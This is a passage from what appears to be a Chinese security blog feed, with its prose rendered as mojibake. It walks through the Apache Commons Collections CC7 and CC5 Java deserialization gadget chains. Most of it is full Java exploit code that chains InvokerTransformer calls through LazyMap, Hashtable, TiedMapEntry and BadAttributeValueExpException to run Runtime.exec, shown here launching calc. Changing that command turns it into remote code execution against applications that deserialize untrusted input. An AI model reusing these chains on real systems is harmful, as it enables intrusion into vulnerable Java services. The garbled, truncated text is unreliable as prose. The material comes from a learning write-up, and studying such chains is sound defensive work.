alt="image-20230709135419679"><br>ç„¶åå°±ç›´æ¥falseäº†ä¸ä¼šè¿›å…¥åˆ°getæ–¹æ³•é‚£ä¹ˆä¹Ÿå°±ä¸ä¼šå‘½ä»¤æ‰§è¡Œäº†ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨è¿›å…¥forå¾ªç¯åå°±éœ€è¦ç§»é™¤yyï¼Œæœ€åé¿å…æœ¬åœ°åºåˆ—åŒ–ä¼šå¼¹è®¡ç®—å™¨çš„å¹²æ‰°åœ¨åºåˆ—åŒ–çš„è¿‡ç¨‹ä¿®æ”¹ä¸ºå¸¸æ•°ï¼Œå› ä¸ºHashtable#put ä¸­ä¹Ÿä¼šè°ƒç”¨åˆ° AbstractMap#equals ä»è€Œè§¦å‘ LazyMap#getï¼Œç„¶åååºåˆ—åŒ–çš„æ—¶å€™é€šè¿‡åå°„ä¿®æ”¹å›æ¥å°±è¡Œ<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.util.AbstractMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC7Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap1 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">decorateMap1</span> <span class="operator">=</span> LazyMap.decorate(hashMap1, chainedTransformer);  </span><br><span class="line">        decorateMap1.put(<span class="string">&quot;yy&quot;</span>, <span class="number">1</span>);  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">decorateMap2</span> <span class="operator">=</span> LazyMap.decorate(hashMap2, chainedTransformer);  </span><br><span class="line">        decorateMap2.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">1</span>);  </span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();  </span><br><span class="line">        hashtable.put(decorateMap1, <span class="number">1</span>);  </span><br><span class="line">        hashtable.put(decorateMap2, <span class="number">1</span>);  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> ChainedTransformer.class;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);  </span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        field.set(chainedTransformer, transformers);  </span><br><span class="line">        decorateMap2.remove(<span class="string">&quot;yy&quot;</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//        serialize(hashtable);  </span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091354569.png" alt="image-20230709135450394"></li></ul><h2 id="æµç¨‹å›¾"><a href="#æµç¨‹å›¾" class="headerlink" title="æµç¨‹å›¾"></a>æµç¨‹å›¾</h2><p>è¿™æ¡é“¾å­è·Ÿçš„æ¯”è¾ƒéš¾å—ï¼Œä¸­é€”æˆ‘ideaè°ƒè¯•çš„æ—¶å€™å‡ºç°äº†ç„å­¦é—®é¢˜ï¼Œä¸ç®¡æ€ä¹ˆæˆ‘æ€ä¹ˆå¼„Hashtableè¿™ä¸ªç±»ï¼Œå¼„äº†åŠå¤©æ²¡å¼„å¥½ä¸­é—´æœ‰äº‹å„¿å»äº†æ²¡å¼„äº†ï¼Œç­‰æˆ‘ç¬¬äºŒå¤©æ¥è°ƒå‘ç°çªç„¶åˆå¥½äº†ä½†æ˜¯æ­¤æ—¶æ€è·¯æ²¡æœ‰ä¸€å¼€å§‹é‚£ä¹ˆæ¸…æ™°äº†ï¼Œæˆ‘ä¹Ÿæ‡’å¾—å†é‡æ–°åˆ†æäº†ä»¥ååˆ·é¢˜çš„æ—¶å€™å†å¼„ä¸€ä¸‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091355993.png" alt="image-20230709135500947"></p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Javaå­¦ä¹ ä¹‹CCé“¾5</title>
      <link href="/2023/07/Java%E5%AD%A6%E4%B9%A0%E4%B9%8BCC%E9%93%BE5/"/>
      <url>/2023/07/Java%E5%AD%A6%E4%B9%A0%E4%B9%8BCC%E9%93%BE5/</url>
      
        <content type="html"><![CDATA[<h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><p>commons-collectionsç‰ˆæœ¬å¦‚ä¸‹ï¼Œè¿™é‡Œæˆ‘ä¸€ç›´å‚è€ƒçš„åšå®¢æ²¡è¯´ï¼Œä½†å¦‚æœæ˜¯4.0çš„è¯æ˜¯æœ‰é—®é¢˜çš„åé¢ä¼šæåˆ°ï¼Œå…¶å®ƒç¯å¢ƒæ²¡å˜</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line">    &lt;groupId&gt;commons-collections&lt;/groupId&gt;  </span><br><span class="line">    &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;  </span><br><span class="line">    &lt;version&gt;3.2.1&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h2 id="é“¾å­åˆ†æ"><a href="#é“¾å­åˆ†æ" class="headerlink" title="é“¾å­åˆ†æ"></a>é“¾å­åˆ†æ</h2><p>CC5å°±æ˜¯æ”¹äº†å…¥å£ç‚¹ç„¶åå’ŒCC1çš„LazyMapè¿æ¥èµ·æ¥ï¼Œç»„é•¿åé¢ä¸¤æ¡é“¾å­æ²¡æœ‰è¯¦ç»†è®²äº†ï¼Œå› ä¸ºå¤§åŒå°å¼‚ï¼Œè¿™é‡Œç›´æ¥ç»™äº†å…¥å£ç±»ï¼Œå› ä¸ºè¿™æ¡é“¾å­è‡ªå·±å»æ‰¾è¿˜æ˜¯æ¯”è¾ƒå›°éš¾çš„ï¼Œä¸º<code>BadAttributeValueExpException</code> çš„ <code>readObject()</code>æ–¹æ³•ï¼Œç„¶åè¦å’Œ<code>LazyMap.get()</code>è¿ä¸Šï¼Œé‚£ä¹ˆå°±æ˜¯æ‰¾è°è°ƒç”¨äº†<code>get()</code>æ–¹æ³•è¿™é‡Œå¦‚æœå»find usageså»æ‰¾çš„è¯å¾ˆéº»çƒ¦ï¼Œè°ƒç”¨å®åœ¨å¤ªå¤šäº†å°±ç›´æ¥çœ‹å§ï¼Œæœ€åæ˜¯æ‰¾åˆ°äº†<code>TiedMapEntry</code>ç±»çš„<code>getValue()</code>æ–¹æ³•è°ƒç”¨äº†<code>LazyMap.get()</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091343468.png" alt="image-20230709134237186"><br>è¿™é‡Œçš„mapå°±æ˜¯<code>LazyMap</code>çš„å¯¹è±¡ï¼Œæˆ‘ä»¬åœ¨ç»™TiedMapEntryç±»å®ä¾‹åŒ–çš„æ—¶å€™ä¼šä¼ <code>LazyMap</code>ï¼Œè€Œè¿™ä¸ªç±»çš„<code>toString()</code>æ–¹æ³•è°ƒç”¨äº†<code>getValue()</code>æ–¹æ³•ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æŠŠ<code>TiedMapEntry</code>ç±»çš„<code>toString()</code>æ–¹æ³•å’Œå…¥å£ç±»<code>BadAttributeValueExpException</code> çš„ <code>readObject()</code>æ–¹æ³•è¿èµ·æ¥è¿™æ¡é“¾å­å°±å®Œæˆäº†<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091343096.png" alt="image-20230709134339935"><br>å‘ç°readObjectæ–¹æ³•è¿™é‡Œ<code>valObj</code>è°ƒç”¨äº†<code>toString()</code>æ–¹æ³•ï¼Œæƒ³åŠæ³•è®©<code>valObj</code>å˜ä¸º<code>TiedMapEntry</code>ç±»çš„å¯¹è±¡å°±è¡Œäº†ï¼Œå…ˆçœ‹ä¸€ä¸‹å®ƒçš„åˆå§‹åŒ–</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> ois.readFields();  </span><br><span class="line"><span class="type">Object</span> <span class="variable">valObj</span> <span class="operator">=</span> gf.get(<span class="string">&quot;val&quot;</span>, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå…¶å®<code>valObj</code>å°±æ˜¯<code>val</code>è€Œ<code>val</code>å°±æ˜¯<code>BadAttributeValueExpException</code> ç±»ä¸­ç›´æ¥å®šä¹‰çš„<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091344942.png" alt="image-20230709134416810"><br>é‚£ä¹ˆé€šè¿‡åå°„ä¿®æ”¹å°±è¡Œäº†ï¼Œå†æ¥çœ‹ä¸ºä»€ä¹ˆ<code>BadAttributeValueExpException</code> ç±»å¯ä»¥ååºåˆ—åŒ–</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BadAttributeValueExpException</span> <span class="keyword">extends</span> <span class="title class_">Exception</span>   &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exception</span> <span class="keyword">extends</span> <span class="title class_">Throwable</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Throwable</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br></pre></td></tr></table></figure><p>è‡³æ­¤é“¾å­åˆ†æå°±ç»“æŸäº†</p><h2 id="EXPç¼–å†™"><a href="#EXPç¼–å†™" class="headerlink" title="EXPç¼–å†™"></a>EXPç¼–å†™</h2><p>åé¢çš„å‘½ä»¤æ‰§è¡ŒCC1çš„LazyMapå¯ä»¥ç”¨æ‰€ä»¥ç›´æ¥æ‹¿è¿‡æ¥å°±è¡Œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC5Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">  </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        Map&lt;Object,Object&gt; decorateMap = LazyMap.decorate(hashMap,  chainedTransformer);  </span><br><span class="line">  </span><br><span class="line">        Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;  </span><br><span class="line">        <span class="type">Method</span> <span class="variable">LazyMapget</span> <span class="operator">=</span> lazyMapClass.getDeclaredMethod(<span class="string">&quot;get&quot;</span>, Object.class);  </span><br><span class="line">        LazyMapget.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        LazyMapget.invoke(decorateMap,chainedTransformer);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091344744.png" alt="image-20230709134433612"><br>æ‰§è¡ŒæˆåŠŸï¼Œåœ¨è¿™é‡Œæˆ‘å‘ç°commons-collectionsç‰ˆæœ¬å¾—ç”¨3.2.1ä¸ç„¶ä¸‹é¢è¿™ä¸ªåœ°æ–¹å°±ä¼šæŠ¥é”™<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091347346.png" alt="image-20230709134754280"><br>å› ä¸ºåœ¨<code>commons-collections 4.0</code>ç‰ˆæœ¬LazyMapé‡Œé¢æ²¡æœ‰è¿™ä¸ªæ–¹æ³•<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091344900.png" alt="image-20230709134451829"><br>é‚£ä¹ˆæ¥ä¸‹æ¥å°±å¾—æŠŠ<code>TiedMapEntry</code>ç±»å’Œ<code>LazyMap</code>ç±»è¿èµ·æ¥ï¼Œé‚£ä¹ˆå…ˆçœ‹ä¸€çœ‹è¿™ä¸ªç±»çš„æ„é€ å‡½æ•°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TiedMapEntry</span><span class="params">(<span class="keyword">final</span> Map&lt;K, V&gt; map, <span class="keyword">final</span> K key)</span> &#123;  </span><br><span class="line">    <span class="built_in">super</span>();  </span><br><span class="line">    <span class="built_in">this</span>.map = map;  </span><br><span class="line">    <span class="built_in">this</span>.key = key;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ˜¯ä¸€ä¸ªpublicç±»é‚£ä¹ˆè°ƒç”¨å°±æ›´åŠ ç®€å•äº†ï¼Œæ‰€ä»¥è¿™é‡Œåªéœ€è¦æŠŠLazyMapçš„å¯¹è±¡decorateMapä¼ å…¥å³å¯ï¼Œå¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC5Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">  </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        Map&lt;Object,Object&gt; decorateMap = LazyMap.decorate(hashMap,  chainedTransformer);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(decorateMap, <span class="string">&quot;value&quot;</span>);  </span><br><span class="line">        tiedMapEntry.toString();  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç°åœ¨å°±æ˜¯å’Œå…¥å£ç±»è¿èµ·æ¥ï¼Œ<code>BadAttributeValueExpException</code> çš„ä½œç”¨åŸŸæ˜¯publicæ‰€ä»¥ç›´æ¥newä¸€ä¸ªå¯¹è±¡å°±è¡Œï¼Œå¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯è®©<code>val</code>å˜ä¸º<code>TiedMapEntry</code>çš„å¯¹è±¡ï¼Œå› ä¸ºè¿™ä¸ªå˜é‡æ˜¯ç§æœ‰çš„æ‰€ä»¥åˆ©ç”¨åå°„ä¿®æ”¹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>);  </span><br><span class="line"><span class="type">Field</span> <span class="variable">declaredField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;val&quot;</span>);  </span><br><span class="line">declaredField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">declaredField.set(badAttributeValueExpException,tiedMapEntry);</span><br></pre></td></tr></table></figure><p>åˆ°è¿™é‡Œå°±ç»“æŸäº†ï¼Œå®Œæ•´EXPå¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> 